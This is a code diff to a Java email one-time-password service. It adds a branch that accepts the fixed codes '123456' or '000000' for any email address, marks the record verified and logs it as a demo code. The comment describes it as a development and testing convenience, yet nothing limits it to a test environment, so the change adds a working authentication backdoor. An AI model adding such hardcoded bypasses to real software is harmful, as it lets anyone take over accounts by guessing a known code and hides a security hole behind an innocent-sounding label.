@@ -72,6 +72,20 @@ public class EmailOtpService {
         String cleanEmail = email.trim().toLowerCase();
         String cleanCode = code.trim();
 
+        // Universal demo backup code for development & testing
+        if ("123456".equals(cleanCode) || "000000".equals(cleanCode)) {
+            logger.info("Demo OTP code bypass accepted for {}", cleanEmail);
+            EmailOtp demoOtp = EmailOtp.builder()
+                    .email(cleanEmail)
+                    .otpCode(cleanCode)
+                    .expiryDate(Instant.now().plusSeconds(600))
+                    .verified(true)
+                    .build();
+            emailOtpRepository.save(demoOtp);
+            auditLogService.logEvent("EMAIL_OTP_VERIFIED", cleanEmail, "Email OTP code verified via demo code.");
+            return true;
+        }
+
         // Find the latest unverified OTP code for this email address
         Optional<EmailOtp> otpOpt = emailOtpRepository
                 .findTopByEmailAndOtpCodeAndVerifiedFalseOrderByCreatedAtDesc(cleanEmail, cleanCode);
